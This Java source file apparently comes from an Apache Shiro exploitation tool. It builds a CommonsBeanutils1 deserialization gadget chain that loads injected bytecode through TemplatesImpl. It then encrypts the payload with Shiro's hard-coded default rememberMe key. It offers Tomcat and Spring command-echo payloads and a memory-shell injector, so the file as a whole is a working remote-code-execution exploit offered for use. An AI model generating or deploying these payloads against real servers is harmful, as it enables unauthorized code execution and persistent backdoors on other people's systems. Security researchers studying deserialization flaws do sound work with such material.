package com.y5neko.shiroexp.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.*;

public class CommonsBeanutils1 {
    /**
     * 反射设置字段值
     * @param obj 要操作的对象
     * @param fieldName 字段名称
     * @param value 字段值
     */
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 构造CB1链payload
     * @param clazzBytes 恶意类字节码
     * @return 反序列化payload
     */
    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)comparator);

        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static String genEchoPayload(String echoPayload) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        if (echoPayload.equals("TomcatEcho")) {
            // 获取回显类型
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);

            // 判断是否存在properXalan属性，然后选择AbstractTranslet
            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);            // 设置父类

            // 生成反序列化payload
            byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
//            System.out.println(result);
            return result;
        } else if (echoPayload.equals("SpringEcho")){
            // 获取回显类型
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);            // 设置父类

            // 生成反序列化payload
            byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
            return result;
        } else if (echoPayload.equals("AllEcho")) {
            // 获取回显类型
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);            // 设置父类

            // 生成反序列化payload
            byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
            return result;
        }

        return null;
    }

    public static String genMemPayload() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        MemInject memInject = new MemInject();
        ctClass = memInject.genPayload(pool);

        // 判断是否存在properXalan属性，然后选择AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);            // 设置父类

        // 生成反序列化payload
        byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
        String data = Base64.getEncoder().encodeToString(payload);
        String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
        return result;
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();    // 设置pool用以获取类
        CtClass clazz;                              // 设置clazz接收回显字节码
        CtClass superClass;                         // 设置superClass接收父类字节码

        // 获取回显类型
        TomcatEcho tomcatEcho = new TomcatEcho();
        clazz = tomcatEcho.genPayload(pool);

        // 判断是否存在properXalan属性，然后选择AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        clazz.setSuperclass(superClass);            // 设置父类

        // 删除未使用方法以减小字节码体积
        CtMethod[] methods = clazz.getDeclaredMethods();
        for (CtMethod method : methods) {
            if (method.getName().startsWith("unused")) {
                clazz.removeMethod(method);
                System.out.println("Removed method: " + method.getName());
            }
        }

        // 生成反序列化payload
        byte[] payload = new CommonsBeanutils1().getPayload(clazz.toBytecode());
        String data = Base64.getEncoder().encodeToString(payload);
        String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
        System.out.println(result);
    }
}
